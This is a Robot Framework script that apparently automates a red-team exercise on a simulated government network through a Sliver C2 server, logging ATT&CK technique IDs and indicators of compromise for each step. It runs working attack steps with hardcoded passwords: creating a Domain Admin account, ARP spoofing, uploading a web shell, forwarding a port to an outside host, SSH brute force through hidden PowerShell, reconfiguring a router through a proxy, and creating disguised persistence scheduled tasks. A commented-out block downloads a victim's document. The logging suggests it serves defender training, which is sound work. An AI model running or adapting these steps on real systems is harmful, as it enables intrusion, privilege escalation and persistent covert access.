    #Login              ${LOCAL_USER}    ${USER_PASS}
    Write               ssh ${LOCAL_USER}@${TARGET_DC_IP}
    ${output}           READ    delay=5s
    IF         '${verify_string}' in $output
        Write     yes
        ${output}=     Read Until    ${password_string}
        Log To Console          Output from Read ${output}
        Write                   ${USER_PASS}
        ${results}              Read          delay=1s
        Log To Console          results for password ${results}
    ELSE
        #IF       '${password_string}' in '''${check_string}'''
        IF       '${password_string}' in $output
            Write                   ${USER_PASS}
            ${results}=              Read      delay=5s
            Log To Console          results for password ${results}
        END
    END

    #Read Until          password
    #Write               ${USER_PASS}
    Command Pause

    #Set Client Configuration    timeout=1 day
   # Write              powershell $securePassword = ConvertTo-SecureString "1R34llyL0v3P1zz4!" -AsPlainText -Force 
   # Read               delay=3s   
   # Log It     ${LOG_FILENAME}    Command and Scripting Interpreter: PowerShell; Issued command powershell $securePassword = ConvertTo-SecureString "1R34llyL0v3P1zz4!" -AsPlainText -Force        machine="${TARGET_DC_IP}      ioc="Entry in PowerShell logs"        tid="T1059.001"
   # Command Pause
    # UPDATED: Changed UserPrincipalName domain to di.gov.gk
    Switch Connection       newUser
    Set Client Configuration      newline=CRLF
    Write           Powershell
    Read Until      Copyright (C) Microsoft Corporation. All rights reserved
    Write           New-ADUser -Name "Oliver Jones" -GivenName "Oliver" -Surname "Jones" -SamAccountName "oliver.jones" -UserPrincipalName "oliver.jones@di.gov.gk" -AccountPassword (ConvertTo-SecureString "1R34llyL0v3P1zz4!" -AsPlainText -Force) -Enabled $true
    ${re}=          Read      delay=5s
    Log To Console     output: ${re}
    Command Pause
    # UPDATED: Updated IOC with correct domain
    Log It    ${LOG_FILENAME}    Created new user account using powershell; New-ADUser -Name "Oliver Jones" -GivenName "Oliver" -Surname "Jones" -SamAccountName "oliver.jones" -UserPrincipalName "oliver.jones@di.gov.gk" -AccountPassword (ConvertTo-SecureString "1R34llyL0v3P1zz4!" -AsPlainText -Force) -Enabled $true    machine=151.102.64.5    ioc=New User;Username: oliver.jones;Email: oliver.jones@di.gov.gk;Account Enabled;Entry in PowerShell Logd   tid=T1059.001;T1136.002
    
    Sleep              2s
    Log To Console     User creation processing...
    ${re}=             Write          Add-ADGroupMember -Identity 'Domain Admins' -Members 'oliver.jones'
    Log To Console     output: ${re}
    Command Pause
    Log It    ${LOG_FILENAME}    Added user to Domain Admins group using powershell; Add-ADGroupMember -Identity 'Domain Admins' -Members 'oliver.jones'    machine=151.102.64.5    ioc=Privilege Escalation;Group Modification;Group: Domain Admins;Member Added: oliver.jones;Credential: 1R34llyL0v3P1zz4!;Entry in Powershell Logs    tid=T1098;T1059.001

    #Write            exit
    Close Connection

    #Stop Packet Capture

    Stage Pause

   Start Packet Capture    Arp Spoofing    baqt1_arp_spoofing

    Log To Console    ARP Spoofing Start
    #Log It    ${LOG_FILENAME}    Initiating ARP spoofing attack    machine=Rogue Kali    ioc=ARP Poisoning;Man-in-the-Middle;Network Interception;Target Gateway: 151.102.65.1    tid=TID-0015
    
    #Open Connection    ${ROGUE_HOST}    port=${ROGUE_PORT}    alias=rogue
    #Login              ${ROGUE_USER}    ${ROGUE_PASS}
    #Set Client Configuration    timeout=1 day
    #Run ARP Spoofer Shell Script
    IF    ${test} == 1
        VAR        ${ARP_DURATION}    10
    ELSE
        VAR        ${ARP_DURATION}    3600
    END
    #Run Process         ${ARP_SPOOF_SCRIPT}    ${ARP_DURATION}

    Get Local Terminal    127.0.0.1   bah    P@ssw0rd    arpSpoof
    Write               ssh -p 2222 Administrator@localhost
    Write               cd ~/Arp-Spoofer
    #Log It    ${LOG_FILENAME}    Starting ARP Spoofer to generate traffic against the router;     machine=151.102.65.1    ioc=Several ARP messages against the router (ARP cache)  tid=T1557.002
    Log It     ${LOG_FILENAME}    ARP spoofing attack running    machine=151.102.65.1   ioc=Traffic Interception Active;Network Traffic Redirected;Subnet: 151.102.65.0/24    tid=T1557.002
    Write               echo P@ssw0rd | sudo -S -E timeout ${ARP_DURATION} python3 ./arpspoof.py -i ${RESP_IFACE} -f 151.102.65.1
    Log It    ${LOG_FILENAME}    ARP spoofer complete;     machine=151.102.65.1    ioc=Several ARP messages against the router (ARP cache)  tid=T1557.002
    #Write               sudo -E ./arpspoof.py -i ${RESP_IFACE} -f 151.102.65.1
    #Read Until         [sudo] password for Administrator: 
    #Write              ${ROGUE_PASS}
    #Read Until         [!] ARP packets ready. Execute the attack with these settings? (Y/N)
    #Write              Y
    #${re}=             Read       
    #Log To Console     \narpsppof.py output: ${re}
    #Log To Console     \n[*] ARP spoofing started and running...
    #Log To Console     [*] Will wait 1 hour or CTRL+C to end.
    #Write 


    Sleep              10m
    #Close Connection
    Stop Packet Capture
    

   Start Packet Capture    Persistence    baqt1_persistence

    Log To Console      \nRunning Persistence...
    ${beacon_id}=    Wait For Beacon Checkin With Specific Ip    ${TARGET_WEB_IP}    timeout=${BEACON_TIMEOUT}    # Wait for a beacon from DI-WEB
    Log To Console      \nGot Beacon ${beacon_id} from ${TARGET_WEB_IP} - DI-WEB
    Set Active Beacon    ${beacon_id}
    Change Directory    C:/inetpub/wwwroot/aspnet_client/
    Sleep        60s
    Log To Console      \nUploading util.aspx
    Upload File         ${ARTIFACT_DIR_Backup}/util.aspx    C:\\inetpub\\wwwroot\\aspnet_client\\
    Sleep        60s
    # UPDATED: Changed machine reference from MOD-WEB to DI-WEB
    Log It    ${LOG_FILENAME}    Persistence: Web-shell upload    machine=${TARGET_WEB_IP}   ioc=upload util.aspx to C:\\inetpub\\wwwroot\\aspnet_client    tid=T1505.003
    
   Stop Packet Capture

    Stage Pause

   Start Packet Capture    Open_Port    baqt1_open_port

    Log To Console          \nRunning Port Forwarding...
    # UPDATED: Changed expected beacon target for port forwarding
    Log To Console      \nGrabbing DI-W10-3 Beacon
    ${beacon_id}=    Wait For Beacon Checkin With Specific Ip    151.102.65.142    timeout=${BEACON_TIMEOUT}    # Wait for a beacon from DI-W10-3
    Log To Console      \nGot Beacon ${beacon_id} from 151.102.65.142 - DI-W10-3
    Set Active Beacon    ${beacon_id}
    Run Port Forwarding      443     31.148.54.96     6666
    Command Pause
    # UPDATED: Changed machine reference in IOC
    Log It    ${LOG_FILENAME}    Port Forwarding    machine=${DI_W10_3}    ioc=rportfwd 443 31.148.54.96 6666    tid=T1090.001
    
   Stop Packet Capture

    # NEW CAPABILITY: Network Device Attack - This section needs implementation in Robot Framework
    Stage Pause
    
    ###Start Packet Capture    Network Device Attack    network_device_attack




    Log To Console    \nRunning Network Device Attack...
    # TODO: Implement Network Device Attack capability
    # This needs to include:
    # 1. SSH brute force simulation setup (python3 -m http.server 8080)
    # 2. Upload and execute run_brute.ps1 on DI-W11-5 beacon
    # 3. Set up SOCKS proxy (socks 9050 socks5) on DI-W10-5 beacon  
    # 4. Proxied SSH to router (proxychains ssh cisco@151.102.65.1)
    # 5. Router configuration commands:
    #    - conf t
    #    - ip nat inside source static tcp 151.102.65.1 443 interface GigabitEthernet3 8443
    #    - end
    Log To Console     Starting http server on 8080...
    Start Process      ${SSH_BRUTESIM_SCRIPT}
    # Get Local Terminal    127.0.0.1   user    password    brute
    # Write       cd /home/user/sshbrutesim
    # Write       python3 -m http.server 8080 &
    #${pid}      Start Process      python3      -m       http.server       8080
    #Log To Console    \nHttp Server running with pid: ${pid.pid}
    Log To Console    \nHttp Server running with pid:
    Command Pause

    ${beacon_id}=       Wait For Beacon Checkin With Specific Ip    ${DI_W11_5}     timeout=${BEACON_TIMEOUT}   # Wait for a beacon from DI-DC
    Log To Console      \nGot Beacon ${beacon_id} from ${DI_W10_5}  - DI-w11-5
    Set Active Beacon   ${beacon_id}
    Upload File         ${ARTIFACT_DIR_BACKUP}/run_brute.ps1    C:\\
    Log It              ${LOG_FILENAME}    Uploading file run_brute.ps1 to ${DI_W11_5}    machine=${DI_W11_5}    ioc=file run_brute.ps1 located at C:\\Users\\rodrigo.allison    tid=T1105
    Run Command         powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File run_brute.ps1
    Log It              ${LOG_FILENAME}     Command and Scripting Interpreter: PowerShell; Issued command powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File run_brute.ps1      machine=${BRUTE_FORCE_IP}      ioc="entry in PowerShell logs;run_brute.ps1 execution"       tid=T1059.001
    Log It              ${LOG_FILENAME}     Files brute.ps1, wordlist.txt, and plink.exe via Ivoke-WebRequest    machine=${DI_W11_5}     ioc=files brute.ps1, wordlist.txt, and plink.exe located at C:\\Users\\rodrigo.allison       tid=T1059
    Log It              ${LOG_FILENAME}     brute.ps1 executing on target   machine=${DI_W11_5}     ioc=brute.ps1 execution process       tid=T1059
    Sleep               14400      # Need to give the bruteforce routine time to go through all of the possible attempts
    Log It              ${LOG_FILENAME}     run_brute.ps1, brute.ps1, wordlist.txt, and plink.exe deleted from target   machine=${DI_W11_5}     ioc=run_brute.ps1, brute.ps1, wordlist.txt, and plink.exe deleted      tid=T1059

   Shift Pause

   ${beacon_id}=        Wait For Beacon Checkin With Specific Ip    ${DI_W10_5}     timeout=${BEACON_TIMEOUT}   # Wait for a beacon from DI-DC
    Log To Console      \nGot Beacon ${beacon_id} from ${DI_W10_5}   - DI-w10-5
    Set Active Beacon   ${beacon_id}
    Start Socks         9050     socks5 
    Log It              ${LOG_FILENAME}    Started socks server on port 9050    machine=${DI_W10_5}    ioc=internal proxy on port 9095    tid=T1090.001
    
 #   Get Local Terminal    127.0.0.1   user    password    proxychains
 #   Write             proxychains ssh cisco@151.102.65.1
 #   #Read Until       password
 #   Write            cisco
 #   Read             delay=20s
 #   Write            conf t
 #   Read Until       End with CNTL/Z      delay=2s
 #   Write            ip nat inside source static tcp 151.102.65.1 443 interface GigabitEthernet3 8443
 #   Write            end
 #   Close Connection
    VAR        ${password}       Password:
    Open Connection    localhost       alias=proxychains      escape_ansi=True       timeout=5m
    Login       bah    P@ssw0rd
    ${output}         Read    delay=3s
    Log To Console    ${output}
    Write             proxychains -f /etc/proxychains4.conf ssh cisco@151.102.65.1
    ${output}         Read      delay=20s
    Log To Console    ${output}
    IF        $password in $output
    #Read Until       password
       Write            cisco
       ${output}        Read             delay=20s
       Log To Console    ${output}
       Write            conf t
       ${output}        Read Until       End with CNTL/Z 
       Log To Console     ${output}
       Write            ip nat inside source static tcp 151.102.65.1 443 interface GigabitEthernet3 8443
       Write            end
       ${output}        Read           delay=10s
       Log To Console      ${output}
       Log It              ${LOG_FILENAME}    Configured router and set up proxychains;ip nat inside source static tcp 151.102.65.1 443 interface GigabitEthernet3 8443    machine=151.102.65.1    ioc=conf modified on router   tid=T1090
    ELSE
        Log To Console     \nProxy Chains Failed: connection refused!!!!
    END
    Close Connection
 
 
    

    ######Stop Packet Capture

    # NEW CAPABILITY: Anomalous Malicious Activity - This section needs implementation
    Stage Pause
    
    ########Start Packet Capture    Anomalous Activity    anomalous_activity
    
    Log To Console    \nRunning Anomalous Malicious Activity...
    # TODO: Implement Anomalous Malicious Activity capability
    # This needs to include:
    # 1. Upload clrhost.ps1 to DI-W10-3, DI-W10-5, and DI-W11-5 beacons
    # 2. Create scheduled tasks on each system:
    #    schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\system32\clrhost.ps1" /sc onlogon /rl HIGHEST
    Log To Console     anomalous malicious activity for DI-W10-3....
    ${beacon_id}=       Wait For Beacon Checkin With Specific Ip    ${DI_W10_3}    timeout=${BEACON_TIMEOUT}   # Wait for a beacon from DI-DC
    Log To Console      \nGot Beacon ${beacon_id} from ${DI_W10_3}  - DI-w10-3
    Set Active Beacon   ${beacon_id}
    Change Directory    C:\\Windows\\System32
    Upload File         ${ARTIFACT_DIR_BACKUP}/clrhost.ps1    C:\\
    Log It              ${LOG_FILENAME}    Uploading file clrhost.ps1 to ${DI_W10_3}    machine=${DI_W10_3}    ioc=file clrhost.ps1 located at C:\\Windows\\System32    tid=T1105
    Run Command         schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\clrhost.ps1" /sc onlogon /rl HIGHEST
    Log It              ${LOG_FILENAME}    Scheduled Task;schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\clrhost.ps1" /sc onlogon /rl HIGHEST    machine=${DI_W10_3}    ioc=Scheduled Task: Microsoft CLR Monitor created    tid=T1053.005
  
    Log To Console     anomalous malicious activity for DI-W10-5....
    ${beacon_id}=       Wait For Beacon Checkin With Specific Ip    ${DI_W10_5}    timeout=${BEACON_TIMEOUT}   # Wait for a beacon from DI-DC
    Log To Console      \nGot Beacon ${beacon_id} from ${DI_W10_5}  - DI-w10-5
    Set Active Beacon   ${beacon_id}
    Change Directory    C:\\Windows\\System32
    Upload File         ${ARTIFACT_DIR_BACKUP}/clrhost.ps1    C:\\
    Log It              ${LOG_FILENAME}    Uploading file clrhost.ps1 to ${DI_W10_5}    machine=${DI_W10_5}    ioc=file clrhost.ps1 located at C:\\Windows\\System32    tid=T1105
    Run Command         schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\clrhost.ps1" /sc onlogon /rl HIGHEST
    Log It              ${LOG_FILENAME}    Scheduled Task;schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\clrhost.ps1" /sc onlogon /rl HIGHEST    machine=${DI_W10_5}    ioc=Scheduled Task: Microsoft CLR Monitor created    tid=T1053.005
    
    Log To Console     anomalous malicious activity for DI-W11-5....
    ${beacon_id}=       Wait For Beacon Checkin With Specific Ip    ${DI_W11_5}    timeout=${BEACON_TIMEOUT}   # Wait for a beacon from DI-DC
    Log To Console      \nGot Beacon ${beacon_id} from ${DI_W11_5}  - DI-w11-5
    Set Active Beacon   ${beacon_id}
    Change Directory    C:\\Windows\\System32
    Upload File         ${ARTIFACT_DIR_BACKUP}/clrhost.ps1    C:\\
    Log It              ${LOG_FILENAME}    Uploading file clrhost.ps1 to ${DI_W11_5}    machine=${DI_W11_5}    ioc=file clrhost.ps1 located at C:\\Windows\\System32    tid=T1105
    Run Command         schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\clrhost.ps1" /sc onlogon /rl HIGHEST
    Log It              ${LOG_FILENAME}    Scheduled Task;schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\clrhost.ps1" /sc onlogon /rl HIGHEST    machine=${DI_W11_5}    ioc=Scheduled Task: Microsoft CLR Monitor created    tid=T1053.005
    
 
    # PLACEHOLDER FOR ANOMALOUS MALICIOUS ACTIVITY IMPLEMENTATION  
    #Log To Console    \n[TODO] Anomalous Malicious Activity capability needs implementation
    #Log To Console    \n[TODO] This should include scheduled task creation across multiple systems
    
    ###########Stop Packet Capture

    Stage Pause

    ########Start Packet Capture    Data Exfiltration    data_exfiltration

    #Log To Console    \nRunning Data Exfiltration...
    ## UPDATED: Changed expected beacon target for exfiltration
    #Log To Console      \nGrabbing DI-W11-5 Beacon for exfiltration
    #${beacon_id}=    Wait For Beacon Checkin With Specific Ip    151.102.65.57    timeout=${BEACON_TIMEOUT}    # Wait for a beacon from DI-W11-5
    #Log To Console      \nGot Beacon ${beacon_id} from 151.102.65.57 - DI-W11-5
    #Set Active Beacon    ${beacon_id}
    #Run Command       dir C:\\Users
    #Command Pause
    # UPDATED: Changed target user directory (this may need further updating based on actual DI network users)
    #Run Command       dir C:\\Users\\daryl.barker\\Documents
    #Command Pause
    #Download File     C:\\Users\\daryl.barker\\Documents\\GK_DEFINTEL_ProjectHelios_TechOverview.docx
    #Command Pause

    #Stop Packet Capture

    # UPDATED: Changed machine reference in IOC
    #Log It    ${LOG_FILENAME}    Exfiltration: Data download    machine=DI-W11-5 beacon    ioc="download C:\\Users\\daryl.barker\\Documents\\GK_DEFINTEL_ProjectHelios_TechOverview.docx"    tid="T1041"
    #Render Html       ${LOG_FILENAME}    

    #Log To Console    \nKilling active session (${beacon_id})...
    #Kill Active Session







    # BAQT_AC2 does not end immediatly, see Sleep in final step.
    # Adjust the Sleep from 3600s (1hour) if you want a shorter time or CTRL+C to end

    #Log To Console    Kill DNS Beacon on Target
    #Log It    ${LOG_FILENAME}    Initiating cleanup operations    machine=Operator Host    ioc=Cleanup Phase;Removing Backdoor    tid=TID-0016
    
    #Open Connection    ${DC_IP}    port=${USER_PORT}    alias=sparks
    #Login              ${LOCAL_USER}    ${USER_PASS} 
    ## UPDATED: Changed task name to match updated execution
    #${output1}=    Execute Command    powershell -Command "Stop-ScheduledTask -TaskName 'RunSymantecSysMonitor'; Unregister-ScheduledTask -TaskName 'RunSymantecSysMonitor' -Confirm:$false"
    #Log To Console     Stopped and removed scheduled task: ${output1}
    ## UPDATED: Updated IOC with correct task name
    #Log It    ${LOG_FILENAME}    Removed scheduled task persistence    machine=${DC_IP}    ioc=Scheduled Task Removed;Task: RunSymantecSysMonitor    tid=TID-0016
    
    ## UPDATED: Changed process name to match updated execution
    #${output2}=    Execute Command    powershell -Command "Stop-Process -Name 'SymantecSysMonitor' -Force -ErrorAction SilentlyContinue"
    #Log To Console     Stopped process: ${output2}
    ## UPDATED: Updated IOC with correct process name
    #Log It    ${LOG_FILENAME}    Terminated backdoor process    machine=${DC_IP}    ioc=Process Terminated;Process: SymantecSysMonitor.exe    tid=TID-0017
    
    # UPDATED: Changed file path to match updated execution
    #${output3}=    Execute Command    del C:\\Windows\\System32\\SymantecSysMonitor.exe
    #Log To Console     Deleted file: ${output3}
    ## UPDATED: Updated IOC with correct file path
    #Log It    ${LOG_FILENAME}    Removed backdoor executable    machine=${DC_IP}    ioc=File Deleted;Path: C:\\Windows\\System32\\SymantecSysMonitor.exe    tid=TID-0017

    #Close Connection

    #Log To Console    Finish Sliver
    #Log It    ${LOG_FILENAME}    Terminating C2 connection    machine=Operator Host    ioc=C2 Channel Teardown;Beacon Termination    tid=TID-0018
    
    #Kill Beacons
    #Cleanup Sliver Environment
    #Log To Console     \nBAQT_AC2 execution command series complete.
    #Log It    ${LOG_FILENAME}    Sliver C2 infrastructure shutdown    machine=Operator Host    ioc=C2 Server Stopped;DNS Listener Terminated    tid=TID-0018

    #Stop Packet Capture



